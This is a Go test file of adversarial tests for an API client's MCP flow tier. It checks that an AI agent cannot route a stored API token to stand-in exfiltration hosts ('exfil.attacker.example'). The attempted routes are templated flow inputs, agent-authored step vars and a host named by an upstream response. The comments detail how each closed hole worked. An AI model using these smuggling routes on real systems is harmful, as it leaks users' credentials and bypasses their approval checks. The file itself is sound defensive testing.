package core

// Adversarial tests for the flow tier, written against docs/mcp-agent-interface.md
// and the existing coverage in mcp_flows_test.go and flow_run_test.go (which
// this file deliberately does not repeat). Each test is one of:
//
//   - CONFIRMED-SAFE / COVERAGE-ADDED: an attack was attempted, the boundary
//     held, and there was no regression test pinning it yet.
//   - A CLOSED VULNERABILITY: an attack that once succeeded and has since been
//     fixed in production code. The test asserts the FIXED behaviour, and its
//     comment records both the hole and what holds in its place, so the shape
//     cannot come back unnoticed.

import (
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/mutexdev/lite_api/internal/mcpserver"
	"github.com/mutexdev/lite_api/internal/types"
)

// --- 1. flow inputs as an attack surface, and the guard that closes it ------

// This test pins a CLOSED VULNERABILITY — the flow-tier form of
// TestMCPRunRequestOverrideValueCannotSmuggleASecretPastTheNewHostGuard in
// mcp_run_adversarial_test.go, reached through run_flow's INPUTS instead of
// run_request's variables.
//
// THE HOLE. A flow step's `vars` are interpolated against FLOW SCOPE ONLY
// (flowStepOverrides, flow_run.go), which is what stops a step var from
// resolving an environment secret when it names the secret DIRECTLY
// (flow_run_test.go's
// TestFlowStepVarsResolveAgainstFlowScopeOnlyAndPassSecretsThroughLiterally
// pins that). But nothing stopped a step var from referencing an ORDINARY
// flow input by name, and nothing stopped that input's VALUE — chosen by
// run_flow's caller at run time — from itself being a `{{template}}`.
//
// Here the step var is {"smuggle": "{{passthrough}}"} and the input
// "passthrough" is supplied as "{{apiToken}}". Flow scope does not know
// "apiToken", so flowStepOverrides produced the inert literal "{{apiToken}}"
// exactly as designed — and then handed it to the send as this step's
// override, where the request's own field reads "Authorization: Bearer
// {{smuggle}}". "smuggle" is not a secret name, so mcpReferencedSecrets saw
// no secret in the request at all, so the per-step guard returned before it
// ever computed a target host — while the SAME step's "baseUrl" var, driven
// by a second input, retargeted the request to a brand-new host. The send
// path's multi-pass interpolation then resolved "{{smuggle}}" ->
// "{{apiToken}}" -> the real credential against the full environment map, and
// the secret left the process to a host neither the guard nor the user ever
// saw.
//
// WHAT NOW HOLDS, and the distinction it turns on. The guard refuses
// AGENT-SUPPLIED values that reach a secret (mcpRefuseSecretInjectingValues,
// mcp_guard.go). For a flow, the agent supplies the INPUTS, not the overrides:
// a step var of {"token": "{{apiToken}}"} is the USER writing that reference
// into the flow, is documented behaviour, and still works (the fixture's own
// provisionFlow does exactly that). An INPUT whose value is a template that
// reaches a secret has no such honest reading, and is refused outright, naming
// the input and the secret. Belt and braces, the guard also now follows the
// overrides when deciding whether a secret is in play at all, so a step var
// that aims a credential at a request is host-checked rather than invisible —
// which is what TestMCPRunFlowGuardCatchesASecretAimedAtARequestThroughAStepVar
// below measures.
func TestMCPRunFlowInputValueCannotSmuggleASecretPastThePerStepGuard(t *testing.T) {
	f := newMCPFlowFixture(t)
	// No frontend: a run that merely reached the approval prompt would also
	// fail, so the assertions below distinguish a refusal from a denial.
	f.app.mcpApprovalEmit = nil

	var attackerSawAuth string
	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		attackerSawAuth = r.Header.Get("Authorization")
		w.WriteHeader(http.StatusOK)
	}))
	defer attacker.Close()

	f.app.mu.Lock()
	collection := &f.app.state.Workspaces[0].Collections[0]
	victim := types.NewRequestItem("Flow smuggle victim", "http", len(collection.Items)+1)
	victim.Method = "GET"
	victim.URL = "{{baseUrl}}/x"
	victim.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{smuggle}}", Enabled: true}}
	victim.Body = types.RequestBody{Mode: "none"}
	collection.Items = append(collection.Items, victim)
	victimID := victim.ID
	f.app.mu.Unlock()

	flow := types.Flow{
		ID:     "flow_smuggle",
		Name:   "Smuggle a secret via flow inputs",
		Inputs: []types.FlowInput{{Name: "passthrough"}, {Name: "targetHost"}},
		Steps: []types.FlowStep{{
			ID:        "attack",
			RequestID: victimID,
			Vars: map[string]string{
				"smuggle": "{{passthrough}}",
				"baseUrl": "{{targetHost}}",
			},
		}},
	}
	f.install(flow)

	outcome, err := f.run("flow_smuggle", map[string]string{
		"passthrough": "{{apiToken}}",
		"targetHost":  attacker.URL,
	})
	if err == nil {
		t.Fatalf("an input whose value resolves to a secret was allowed to run: %+v", outcome)
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Fatalf("error is %v, want one that wraps mcpserver.ErrDenied", err)
	}
	if !strings.Contains(err.Error(), `"passthrough"`) || !strings.Contains(err.Error(), "apiToken") {
		t.Errorf("the refusal should name the offending input and the secret: %v", err)
	}
	if strings.Contains(err.Error(), mcpFlowSentinelToken) {
		t.Errorf("the refusal quoted the secret VALUE: %v", err)
	}
	if attackerSawAuth != "" {
		t.Fatalf("the attacker host was reached at all, with Authorization %q", attackerSawAuth)
	}
	for _, request := range f.recorded() {
		if strings.Contains(request.authHeader, mcpFlowSentinelToken) {
			t.Errorf("the credential reached a server: %+v", request)
		}
	}
}

// The complementary half: a step var written by the USER that aims a secret at
// a request whose own fields never name one. This is legitimate authoring —
// the flow tier exists so a flow can point a credential at a request without
// ever holding it — so it must not be REFUSED; but it must be GUARDED, because
// the credential really will resolve on the send path. Retargeted to a
// brand-new host with nobody to approve it, this denies.
func TestMCPRunFlowGuardCatchesASecretAimedAtARequestThroughAStepVar(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.app.mcpApprovalEmit = nil

	// A NAMED host rather than another httptest server, deliberately: every
	// httptest server is 127.0.0.1, and the retired host guard dropped the port, so a
	// second local server would be the SAME host as the fixture's own and the
	// guard would be right to allow it.
	evilHost := "exfil.step-var.attacker.example"

	f.app.mu.Lock()
	collection := &f.app.state.Workspaces[0].Collections[0]
	victim := types.NewRequestItem("Aimed at through a step var", "http", len(collection.Items)+1)
	victim.Method = "GET"
	victim.URL = "{{baseUrl}}/x"
	victim.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{stepToken}}", Enabled: true}}
	victim.Body = types.RequestBody{Mode: "none"}
	collection.Items = append(collection.Items, victim)
	victimID := victim.ID
	f.app.mu.Unlock()

	f.install(types.Flow{
		ID:     "flow_aimed",
		Name:   "A user-authored step var aiming the secret",
		Inputs: []types.FlowInput{{Name: "targetHost"}},
		Steps: []types.FlowStep{{
			ID:        "aimed",
			RequestID: victimID,
			Vars: map[string]string{
				// Authored by the user, and therefore never refused — only
				// guarded.
				"stepToken": "{{apiToken}}",
				"baseUrl":   "{{targetHost}}",
			},
		}},
	})

	outcome, err := f.run("flow_aimed", map[string]string{"targetHost": "https://" + evilHost})
	if err == nil {
		t.Fatalf("a step var aiming the secret at a brand-new host ran unguarded: %+v", outcome)
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Fatalf("error is %v, want one that wraps mcpserver.ErrDenied", err)
	}
	// A DESTINATION DENIAL, not the injection refusal: it names the ORIGIN,
	// because this is the boundary doing its job on a legitimately authored
	// flow. It does not name the secret — the boundary is secret-blind, and the
	// step would be refused the same way carrying nothing at all.
	if !strings.Contains(err.Error(), evilHost) {
		t.Errorf("the denial should name the origin it refused: %v", err)
	}
	for _, request := range f.recorded() {
		if strings.Contains(request.authHeader, mcpFlowSentinelToken) {
			t.Errorf("the credential reached a server: %+v", request)
		}
	}

	// And the same shape against the host the collection already sends this
	// secret to runs cleanly — the guard is scoped to the destination, not to
	// the presence of a step var.
	if _, err := f.run("flow_aimed", map[string]string{"targetHost": f.server.URL}); err != nil {
		t.Fatalf("the same flow, aimed at the collection's own known host, was refused: %v", err)
	}
}

// --- 2. flow guard, the wanted variant: a chained, attacker-shaped host ------

// CONFIRMED-SAFE / COVERAGE-ADDED. The variant this pass's brief calls for
// explicitly: a chained EXTRACTED value used as the next step's baseUrl,
// where the host is chosen by the UPSTREAM SERVER'S RESPONSE rather than
// authored into the flow. Unlike the finding above, the credential-carrying
// field here references the secret's OWN name directly ("Authorization:
// Bearer {{apiToken}}", exactly as the fixture's own requests already do),
// so mcpReferencedSecrets DOES see it and the per-step guard is engaged —
// this is what makes the test above a measurement of a real gap rather than
// "flows never guard anything".
func TestMCPRunFlowGuardCatchesAChainedHostChosenByTheUpstreamResponseNotTheFlowAuthor(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.app.mcpApprovalEmit = nil // nobody to ask: any real check must deny

	// A step 1 whose response body -- entirely under the "attacker" upstream's
	// control -- names the host step 2 should hit next. The flow AUTHOR wrote
	// only "extract nextHost from the body and use it as baseUrl"; the VALUE
	// of nextHost is chosen by whatever step 1's server answers.
	evilHost := "http://exfil.attacker.example"
	f.app.mu.Lock()
	collection := &f.app.state.Workspaces[0].Collections[0]
	hostNamer := types.NewRequestItem("Names the next host", "http", len(collection.Items)+1)
	hostNamer.Method = "GET"
	hostNamer.URL = "{{baseUrl}}/host-namer"
	hostNamer.Body = types.RequestBody{Mode: "none"}
	collection.Items = append(collection.Items, hostNamer)
	hostNamerID := hostNamer.ID
	f.app.mu.Unlock()

	// The fixture's own server (newMCPFlowFixture's default handler) answers
	// any unrecognised path with {"activated":true,"echo":...}; give the
	// "host-namer" path a body carrying the attacker's chosen host instead by
	// installing a second collection item pointed at a dedicated server.
	hostNamingServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"nextHost":"` + evilHost + `"}`))
	}))
	defer hostNamingServer.Close()
	f.app.mu.Lock()
	for i := range collection.Items {
		if collection.Items[i].ID == hostNamerID {
			collection.Items[i].URL = hostNamingServer.URL + "/host-namer"
		}
	}
	f.app.mu.Unlock()

	flow := types.Flow{
		ID:   "flow_chained_host",
		Name: "Chained host chosen by the upstream",
		Steps: []types.FlowStep{
			{
				ID:        "namer",
				RequestID: hostNamerID,
				Extract:   []types.FlowExtract{{Name: "nextHost", From: "body", Path: "$.nextHost"}},
				Assert:    []types.FlowAssert{{Type: "status", Equals: 200}},
			},
			{
				// createID's request carries "Authorization: Bearer {{apiToken}}"
				// directly (see newMCPFlowFixture), so the secret IS statically
				// referenced and the guard IS engaged for this step.
				ID:        "createTerminal",
				RequestID: f.createID,
				Vars:      map[string]string{"baseUrl": "{{nextHost}}"},
			},
		},
	}
	f.install(flow)

	outcome, err := f.run("flow_chained_host", nil)
	if err == nil {
		t.Fatalf("a step retargeted to a host chosen by an upstream response was allowed to run: %+v", outcome)
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Fatalf("error is %v, want one that wraps mcpserver.ErrDenied", err)
	}
	if !strings.Contains(err.Error(), "exfil.attacker.example") {
		t.Errorf("the denial should name the origin it refused: %v", err)
	}
	// Step 1 (the namer) ran and its extraction is reported; step 2 (the
	// retargeted create) is the denial.
	if len(outcome.Steps) != 2 {
		t.Fatalf("outcome reports %d steps, want 2: %+v", len(outcome.Steps), outcome.Steps)
	}
	if outcome.Steps[0].Extracted["nextHost"] != evilHost {
		t.Errorf("step 1's own extraction was lost: %+v", outcome.Steps[0])
	}
	recorded := f.recorded()
	for _, request := range recorded {
		if request.authHeader != "" && strings.Contains(request.authHeader, mcpFlowSentinelToken) {
			// Only step 1 (which carries no Authorization header) may have
			// been sent; the retargeted step must never have reached ANY
			// server with the credential.
			t.Errorf("the credential reached a server: %+v", request)
		}
	}
}

// --- 3. flow secret leaks: the `contains` assertion, and progress events -----

// COVERAGE-ADDED. mcp_flows_test.go's
// TestMCPRunFlowMasksAssertionDetailsAndStepErrors exercises the `equals`
// branch of flowEvaluateBodyAssert (flow_run.go's "%s equals %q, but it was
// %q" message). The `contains` branch builds a DIFFERENT message ("%s
// contains %q, but it was %q", flow_run.go's flowEvaluateBodyAssert) that
// also quotes the value actually found — an independent format string, and
// therefore an independent place a secret could have been missed by
// mcpFlowRunOutcome's masking.
func TestMCPRunFlowMasksTheFoundValueInAFailedContainsAssertion(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.install(types.Flow{
		ID:   "flow_echo_contains",
		Name: "Assert contains on the echoed credential",
		Steps: []types.FlowStep{{
			ID:        "echo",
			RequestID: f.activateID,
			Assert:    []types.FlowAssert{{Type: "body", Path: "$.echo", Contains: "something-that-is-not-there"}},
		}},
	})

	outcome, err := f.run("flow_echo_contains", nil)
	if err != nil {
		t.Fatalf("RunFlow returned an error for a flow that ran and failed its own check: %v", err)
	}
	if outcome.OK {
		t.Fatal("the failing contains assertion was reported as a pass")
	}
	detail := outcome.Steps[0].Assertions[0].Detail
	if strings.Contains(detail, mcpFlowSentinelToken) {
		t.Fatalf("the contains-assertion detail quoted the secret: %q", detail)
	}
	if !strings.Contains(detail, mcpserver.MaskedValue) {
		t.Fatalf("the contains-assertion detail is %q, want the found value masked", detail)
	}
}

// COVERAGE-ADDED. flow:progress is pushed once per step, before and after it
// runs (emitFlowProgress, flow_run.go). types.FlowProgress today carries only
// ids, indices and a state string — no field for a value at all — so this
// cannot leak by construction. Pinned anyway: a field added to FlowProgress
// later (a current step's request name, a preview of what it sent) would be
// exactly the kind of addition that could carry a resolved secret without
// anyone connecting it to this boundary, and this test would start failing
// the moment that value contained the sentinel.
func TestMCPRunFlowProgressEventsCarryNoSecretValue(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.install(f.provisionFlow())

	var events []types.FlowProgress
	f.app.flowProgressEmit = func(progress types.FlowProgress) {
		events = append(events, progress)
	}

	if _, err := f.run("flow_provision", map[string]string{"storeCode": "DHK-04"}); err != nil {
		t.Fatalf("RunFlow: %v", err)
	}
	if len(events) == 0 {
		t.Fatal("no flow:progress events were emitted; this test measures nothing")
	}
	for _, event := range events {
		encoded, err := json.Marshal(event)
		if err != nil {
			t.Fatalf("marshal a progress event: %v", err)
		}
		if strings.Contains(string(encoded), mcpFlowSentinelToken) {
			t.Fatalf("a flow:progress event carried the secret: %s", encoded)
		}
	}
}

// --- 4. flow inputs: hostile shapes must not crash ---------------------------

// COVERAGE-ADDED. Inputs are attacker-chosen at run time (this pass's own
// framing): a huge value, a value full of control characters, and a value
// that is not valid UTF-8 must all be handled as opaque strings — interpolated,
// carried into an override, sent or refused on their own merits — and must
// never panic the runner.
func TestMCPRunFlowHostileInputShapesDoNotPanic(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.install(f.provisionFlow())

	huge := strings.Repeat("A", 2_000_000)
	control := "line1\x00\x01\x1f\r\nline2\x7f"
	binary := string([]byte{0xff, 0xfe, 0x00, 0xd8, 0x00, 0x00})

	for name, value := range map[string]string{
		"huge (2MB)":             huge,
		"control characters":     control,
		"invalid UTF-8 (binary)": binary,
	} {
		t.Run(name, func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("run_flow panicked on a hostile storeCode input: %v", r)
				}
			}()
			// The outcome (pass, fail, or a refusal) is not the point here —
			// only that nothing panics on the way there.
			_, _ = f.run("flow_provision", map[string]string{"storeCode": value})
		})
	}
}

// --- 4. an AGENT-AUTHORED step var whose VALUE reaches a secret --------------

// This test pins a CLOSED VULNERABILITY, and it is the third appearance of one
// shape: an agent-supplied value reaching a secret through a door nothing
// screened. The first two were run_request's override values and run_flow's
// inputs (pinned above); this one is a step var the agent AUTHORED.
//
// THE HOLE. mcp_guard.go's rule 8 ("an agent value may not inject a
// credential") was enforced for run_request's overrides (mcpValidatedOverrides)
// and for run_flow's INPUTS (mcpRefuseSecretInjectingValues walking
// mcpGuardInput.agentValues). Both rested on one argument: "the agent supplies
// the inputs, not the overrides ... a step var of {"token": "{{apiToken}}"} is
// the USER writing that reference into the flow" (see
// TestMCPRunFlowInputValueCannotSmuggleASecretPastThePerStepGuard above).
//
// PHASE 4 BROKE THAT ASSUMPTION WITHOUT UPDATING THE GUARD. create_flow /
// update_flow let an AGENT author step vars directly, and neither path screened
// a step var's VALUE:
//
//   - flows.go's validateFlow — the single gate both authoring paths call —
//     only refused a step var whose NAME shadowed a secret; `secretNames` was
//     checked against the var's KEY, never against what it was set to.
//   - mcp_write.go's mcpFlowFromDefinition copies step var values through
//     verbatim, by design, with no scan of its own.
//   - mcp_flows.go's RunFlow guard passed the step's own vars as `overrides`
//     (used only to BUILD the map the walk runs through) and `params.Inputs` as
//     `agentValues` (the thing actually walked). A pre-authored step var was
//     therefore never walked at all, at authoring time or run time.
//
// So an agent with the write tier on could author {"storeId": "{{apiToken}}"}
// against an EXISTING, already-approved request whose body carries an ordinary
// non-secret {{storeId}} — no new destination, no approval prompt, no name
// collision — and run_flow resolved the real credential into that field and
// sent it. Not §1.4(3): that disclaims CONFIDENTIALITY once a credential
// legitimately reaches a trusted origin, whereas rule 8 is a separate promise
// about the CHANNEL, and its own reasoning ("an agent that cannot READ a secret
// must not be able to WRITE one") applies here word for word.
//
// WHAT NOW HOLDS, at both doors:
//
//   - AUTHORING. validateFlow refuses it (flowRefuseSecretReachingStepVars),
//     using mcpSecretsReachedByTemplate — the run tier's own walk, so the write
//     tier refuses exactly what the run tier refuses. The refusal names the var
//     and the secret, never a value, and wraps mcpserver.ErrDenied.
//   - RUNNING. While the write tier is on, RunFlow's guard also screens the
//     step's own vars, so a flow authored BEFORE the gate existed cannot be run
//     unattended either. Both halves are asserted below, the second by
//     installing the flow straight into state.
//
// THE TWO HALVES DO NOT GIVE THE SAME ANSWER, and that is deliberate rather
// than an inconsistency. AUTHORING is refused outright, with no approval path:
// the subject there is the agent's own channel, and an agent has no honest need
// to author a step var that aims a credential — the user writes those in the
// app. RUNNING asks the user, because the subject there is a STORED value whose
// author cannot be recovered, and refusing it outright broke the user's own
// flows (the canonical POS chain in our own docs is written exactly this way).
// The run half's prompt, and how narrowly its approval is keyed, is measured in
// mcp_flow_stepvar_approval_test.go; what is asserted here is that an
// unapproved run still refuses, and refuses with the same class.
//
// The refusal is provenance-conditioned: a HUMAN authoring the same step var in
// the app's Flow editor is not refused. See
// TestUIFlowEditorMayStillAuthorAStepVarThatAimsASecret for that ruling, and
// flowRefuseSecretReachingStepVars for the argument.
func TestCreateFlowStepVarValueIsRefusedForAnAgentAuthor(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.app.mu.Lock()
	f.app.state.Preferences.MCP.WriteTierEnabled = true
	f.app.mu.Unlock()

	// The step targets the fixture's PRE-EXISTING "create" request, which
	// already has an ordinary, non-secret {{storeId}} placeholder in its body
	// (`{"storeId":"{{storeId}}"}`) and already sends to the fixture's own
	// server — no new destination is introduced anywhere in this test, which is
	// what makes it a measurement of rule 8 rather than of the destination
	// boundary.
	_, err := f.backend.CreateFlow(mcpserver.CreateFlowParams{
		CollectionID: f.collectionID,
		Flow: mcpserver.FlowDefinition{
			Name: "Looks innocent: just fills in storeId",
			Steps: []mcpserver.FlowStep{
				{ID: "leak", RequestID: f.createID, Vars: map[string]string{"storeId": "{{apiToken}}"}},
			},
		},
	})
	if err == nil {
		t.Fatal("create_flow authored a step var whose value resolves to a secret")
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Fatalf("error is %v, want one that wraps mcpserver.ErrDenied", err)
	}
	if !strings.Contains(err.Error(), `"storeId"`) || !strings.Contains(err.Error(), "apiToken") {
		t.Errorf("the refusal should name the offending var and the secret: %v", err)
	}
	if strings.Contains(err.Error(), mcpFlowSentinelToken) {
		t.Errorf("the refusal quoted the secret VALUE: %v", err)
	}

	// AND THE RUN DOOR, for a flow that got in before the gate existed:
	// installed straight into state, exactly as a flow read off disk would be.
	// The run door ASKS rather than refusing, so this arm answers no — the
	// prompt-then-allow arm is TestMCPRunFlowStepVarPromptsAndRunsWhenApproved.
	f.answerApprovals(false, false)
	f.install(types.Flow{
		ID:   "flow_preauthored_leak",
		Name: "Authored before the gate existed",
		Steps: []types.FlowStep{
			{ID: "leak", RequestID: f.createID, Vars: map[string]string{"storeId": "{{apiToken}}"}},
		},
	})
	outcome, runErr := f.run("flow_preauthored_leak", nil)
	if runErr == nil {
		t.Fatalf("run_flow ran a pre-authored smuggling step var: %+v", outcome)
	}
	if !errors.Is(runErr, mcpserver.ErrDenied) {
		t.Fatalf("run error is %v, want one that wraps mcpserver.ErrDenied", runErr)
	}
	if !strings.Contains(runErr.Error(), `"storeId"`) {
		t.Errorf("the run refusal should name the offending var: %v", runErr)
	}
	// It refused because the USER was asked and said no, not because nothing
	// asked. A run that refused without prompting would be the old behaviour
	// wearing the new test.
	if got := len(f.prompts()); got != 1 {
		t.Errorf("the run refused after %d prompts, want exactly 1", got)
	}
	for _, request := range f.recorded() {
		if strings.Contains(request.body, mcpFlowSentinelToken) {
			t.Errorf("the credential reached a server: %+v", request)
		}
	}
}

// THE RULING ON THE HUMAN AUTHOR, measured rather than asserted in a comment.
//
// The refusal above is conditioned on WHO is authoring, and this is the other
// branch: the same flow, written through the app's own Flow editor binding
// (App.CreateFlow, which is what the Flow tab calls), is ACCEPTED.
//
// WHY THAT IS THE RIGHT ANSWER, in three lines — the argument in full is on
// flowRefuseSecretReachingStepVars. Rule 8's subject is an AGENT-supplied
// value, and the asymmetry it exists to protect ("an agent that cannot READ a
// secret must not be able to WRITE one") does not exist for a user who can open
// the environment editor and read every secret they own. The shape is the flow
// tier's central documented promise — the canonical POS chain in the docs aims
// {{apiToken}} at a request through a step var, and
// TestFlowStepVarBracesRemainLiteralWhileSendIsAuthorized pins it end to end.
// And §1.2(4)/§2 already settle the pattern: every refusal in this design is
// provenance-conditioned so a user action is unaffected.
//
// The write tier is left OFF here deliberately. That is the state in which a
// stored step var is provably the user's — the agent has no authoring channel
// at all — and it is exactly the condition RunFlow's guard uses to decide
// whether to screen step vars at run time.
func TestUIFlowEditorMayStillAuthorAStepVarThatAimsASecret(t *testing.T) {
	f := newMCPFlowFixture(t)

	flow := types.Flow{
		ID:   "flow_ui_authored",
		Name: "The user's own credential reference",
		Steps: []types.FlowStep{
			{ID: "aim", RequestID: f.createID, Vars: map[string]string{"storeId": "{{apiToken}}"}},
		},
	}
	if _, err := f.app.CreateFlow(f.collectionID, flow); err != nil {
		t.Fatalf("the app's own Flow editor was refused the user's own step var: %v", err)
	}

	// And it still RUNS through the MCP tier while the write tier is off: the
	// step's destination is the collection's own, so nothing about a legitimate
	// credential reference is disturbed.
	if _, err := f.run("flow_ui_authored", nil); err != nil {
		t.Fatalf("a user-authored step var was refused at run time with the write tier off: %v", err)
	}
	sawCredential := false
	for _, request := range f.recorded() {
		if request.path == "/terminals" && strings.Contains(request.body, mcpFlowSentinelToken) {
			sawCredential = true
		}
	}
	if !sawCredential {
		t.Error("the user's own step var did not actually resolve the credential at send time, so this test measures nothing")
	}

	// The tier flag is the whole discriminator, so the other side of it is
	// worth pinning here too: turn writes on and the same stored flow ASKS,
	// because from that moment the agent could have authored it and the stored
	// flow cannot say otherwise.
	//
	// IT ASKS — IT DOES NOT REFUSE. That distinction is the change this arm
	// exists to hold: refusing outright would mean the user's own flow, the one
	// this test just proved the app is happy to author, stops running through
	// MCP the moment writes are enabled. Answering yes runs it.
	f.enableWriteTier()
	f.answerApprovals(true, false)
	f.forgetPrompts()
	if _, err := f.run("flow_ui_authored", nil); err != nil {
		t.Fatalf("with the write tier on and the user's approval, the run was still refused: %v", err)
	}
	if got := len(f.prompts()); got != 1 {
		t.Fatalf("with the write tier on the run raised %d prompts, want exactly 1", got)
	}

	// And the same run with the answer reversed is refused, with the class the
	// audit reads.
	f.answerApprovals(false, false)
	if _, err := f.run("flow_ui_authored", nil); !errors.Is(err, mcpserver.ErrDenied) {
		t.Fatalf("a denied prompt gave %v, want an ErrDenied-class refusal", err)
	}
}

// The legitimate shape the fix must not touch: a step var that fills an
// ORDINARY placeholder from an ordinary input. This is what the flow tier is
// for, it is agent-authorable, and it stays that way with the write tier on —
// the refusal is about reaching a SECRET, not about step vars.
func TestCreateFlowStepVarNamingANonSecretInputStillWorks(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.app.mu.Lock()
	f.app.state.Preferences.MCP.WriteTierEnabled = true
	f.app.mu.Unlock()

	created, err := f.backend.CreateFlow(mcpserver.CreateFlowParams{
		CollectionID: f.collectionID,
		Flow: mcpserver.FlowDefinition{
			Name:   "Fill storeId from an input",
			Inputs: []mcpserver.FlowInput{{Name: "aNonSecretInput", Required: true}},
			Steps: []mcpserver.FlowStep{
				{ID: "create", RequestID: f.createID, Vars: map[string]string{"storeId": "{{aNonSecretInput}}"}},
			},
		},
	})
	if err != nil {
		t.Fatalf("create_flow refused an ordinary step var: %v", err)
	}

	outcome, runErr := f.backend.RunFlow(context.Background(), mcpserver.RunFlowParams{
		CollectionID: f.collectionID,
		FlowID:       created.ID,
		Inputs:       map[string]string{"aNonSecretInput": "store_99"},
	})
	if runErr != nil {
		t.Fatalf("run_flow refused an ordinary step var: %v", runErr)
	}
	if !outcome.OK {
		t.Fatalf("the flow did not pass: %+v", outcome)
	}
	sawValue := false
	for _, request := range f.recorded() {
		if request.path != "/terminals" {
			continue
		}
		if strings.Contains(request.body, "store_99") {
			sawValue = true
		}
		if strings.Contains(request.body, mcpFlowSentinelToken) {
			t.Errorf("the credential reached the body of an ordinary step: %+v", request)
		}
	}
	if !sawValue {
		t.Errorf("the step var did not reach the request body at all: %+v", f.recorded())
	}
}
